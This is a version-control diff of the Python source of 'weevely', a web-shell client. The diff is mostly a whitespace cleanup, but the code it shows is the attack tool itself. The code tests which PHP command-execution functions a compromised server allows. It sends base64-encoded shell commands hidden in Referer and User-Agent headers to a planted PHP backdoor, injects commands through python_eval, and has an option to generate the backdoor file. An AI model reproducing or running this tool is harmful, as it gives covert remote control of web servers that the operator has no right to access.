@@ -33,7 +33,6 @@ except IOError:
     
 atexit.register( readline.write_history_file, history )
 
-
 methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]
 
 class weevely:
@@ -76,7 +75,6 @@ class weevely:
 	    print "! ERROR: escape method is not a valid integer.\n"
 	    return
 
-	
 	if o in ("-s", "-show"):
 	  escape=-1
 	  moderun='s'
@@ -99,8 +97,6 @@ class weevely:
 
     # Start
     if 'moderun' in locals():
-
-  
 
       if moderun=='c' or moderun=='t' or moderun=='m' or moderun=='s':
 	
@@ -135,8 +131,6 @@ class weevely:
 	  print "! Please specify where generate backdoor file (-o)"
 	  sys.exit(1)
 	
-
-
       if moderun=='c':       
 	try:
 	  if self.host.checkexecution(escape)<0:
@@ -248,7 +242,6 @@ class weevely:
 	raise
       else:
 	print ret
-    
    
   def listmodules(self):
     
@@ -277,40 +270,38 @@ class weevely:
       
       if f.endswith('.php'):
 	
-	mod = file('modules/' + f)
-	modstr = mod.read()
-	modname = f[:-4]
-	module['name']=modname
-	
-	restring='//.*Author:(.*)'
-	e = re.compile(restring)
-	founded=e.findall(modstr)
-	if founded:
-	  module['author']=founded[0]
+		mod = file('modules/' + f)
+		modstr = mod.read()
+		modname = f[:-4]
+		module['name']=modname
+		
+		restring='//.*Author:(.*)'
+		e = re.compile(restring)
+		founded=e.findall(modstr)
+		if founded:
+		  module['author']=founded[0]
 
-	restring='//.*Description:(.*)'
-	e = re.compile(restring)
-	founded=e.findall(modstr)
-	if founded:
-	  module['description']=founded[0]
-	  
-	restring='//.*Arguments:(.*)'
-	e = re.compile(restring)
-	founded=e.findall(modstr)
-	if founded:
-	  module['arguments'] = [v.strip() for v in founded[0].split(',')]
+		restring='//.*Description:(.*)'
+		e = re.compile(restring)
+		founded=e.findall(modstr)
+		if founded:
+		  module['description']=founded[0]
+		  
+		restring='//.*Arguments:(.*)'
+		e = re.compile(restring)
+		founded=e.findall(modstr)
+		if founded:
+		  module['arguments'] = [v.strip() for v in founded[0].split(',')]
 
-	restring='//.*OS:(.*)'
-	e = re.compile(restring)
-	founded=e.findall(modstr)
-	if founded:
-	  module['os'] = [v.strip() for v in founded[0].split(',')]
+		restring='//.*OS:(.*)'
+		e = re.compile(restring)
+		founded=e.findall(modstr)
+		if founded:
+		  module['os'] = [v.strip() for v in founded[0].split(',')]
 
-	self.modules[module['name']]=module
-     
+		self.modules[module['name']]=module
     
 class host():
-  
   
   def __init__(self,url,pwd):
     self.url=url
@@ -338,7 +329,6 @@ class host():
     sum_ok = []
     sum_no = {}
 
-     
     if escape < 0:
       ran = range(0,9)
     else:
@@ -361,7 +351,6 @@ class host():
       except Exception, e:
 	sum_no[methods[i]]='! ERROR: ' + ret + " " + str(e)
 
-
     # Summary 
     if len(sum_ok)>0 and escape==-2:
       print "+ Accepted functions:",
@@ -375,7 +364,6 @@ class host():
 	print  str(methods.index(m)) + " [" + m + "]", 
       print '\n'  
 	
-
     if first==-1:
       print '! No working functions founded on ' + self.url + '. Exiting...\n'
     else:
@@ -390,7 +378,6 @@ class host():
     cmnd=cmnd.strip()
     cmdstr=base64.b64encode(cmnd)
     
-    
     try: 
       ret=self.execHTTPGet(self.genRefUrl(cmdstr),self.genUserAgent())
     except urllib2.URLError, e:
@@ -404,9 +391,7 @@ class host():
       else:
 	return founded[0].strip()
 
-  
   def execute(self, cmnd, met=-1):
-
     
     if(met==-1):
       met=self.method
@@ -435,10 +420,8 @@ class host():
       #Needs python extension
       cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
 
-    
     ret = self.execute_php(cmnd)
     return ret
-    
     
   def execHTTPGet(self, refurl, useragent):
     req = urllib2.Request(self.url)
@@ -471,18 +454,10 @@ class host():
     
     return ''.join(real_refurl)
     
-      
-    
 if __name__ == "__main__":
-    
     
     app=weevely()
     try:
       app.main()
     except KeyboardInterrupt:
       print '\n\n! Received keyboard interrupt. Exiting...\n'
-      
-      
-    
-    
-   
